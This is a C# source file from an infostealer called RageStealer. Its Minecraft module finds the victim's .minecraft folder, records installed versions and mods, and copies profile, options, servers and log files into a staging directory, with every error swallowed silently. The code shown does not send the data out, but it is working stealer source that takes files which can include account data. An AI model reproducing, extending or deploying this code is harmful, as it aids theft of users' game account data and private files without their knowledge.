using System;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Gaming;

internal sealed class Minecraft
{
	private static readonly string MinecraftPath = Path.Combine(Paths.Appdata, ".minecraft");

	private static void SaveVersions(string sSavePath)
	{
		try
		{
			string[] directories = Directory.GetDirectories(Path.Combine(MinecraftPath, "versions"));
			foreach (string path in directories)
			{
				string name = new DirectoryInfo(path).Name;
				string text = Filemanager.DirectorySize(path) + " bytes";
				string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\versions.txt", "VERSION: " + name + "\n\tSIZE: " + text + "\n\tDATE: " + text2 + "\n\n");
			}
		}
		catch (Exception)
		{
		}
	}

	private static void SaveMods(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "mods"));
			foreach (string text in files)
			{
				string fileName = Path.GetFileName(text);
				string text2 = new FileInfo(text).Length + " bytes";
				string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\mods.txt", "MOD: " + fileName + "\n\tSIZE: " + text2 + "\n\tDATE: " + text3 + "\n\n");
			}
		}
		catch (Exception)
		{
		}
	}

	private static void SaveFiles(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(MinecraftPath);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				string text = fileInfo.Name.ToLower();
				if (text.Contains("profile") || text.Contains("options") || text.Contains("servers"))
				{
					fileInfo.CopyTo(Path.Combine(sSavePath, fileInfo.Name));
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private static void SaveLogs(string sSavePath)
	{
		try
		{
			string path = Path.Combine(MinecraftPath, "logs");
			string text = Path.Combine(sSavePath, "logs");
			if (!Directory.Exists(path))
			{
				return;
			}
			Directory.CreateDirectory(text);
			string[] files = Directory.GetFiles(path);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				string text2 = Path.Combine(text, fileInfo.Name);
				if (!File.Exists(text2))
				{
					fileInfo.CopyTo(text2);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void SaveAll(string sSavePath)
	{
		if (!Directory.Exists(MinecraftPath))
		{
			return;
		}
		Counter.Minecraft = true;
		try
		{
			Directory.CreateDirectory(sSavePath);
			SaveMods(sSavePath);
			SaveFiles(sSavePath);
			SaveVersions(sSavePath);
			SaveLogs(sSavePath);
		}
		catch (Exception)
		{
		}
	}
}
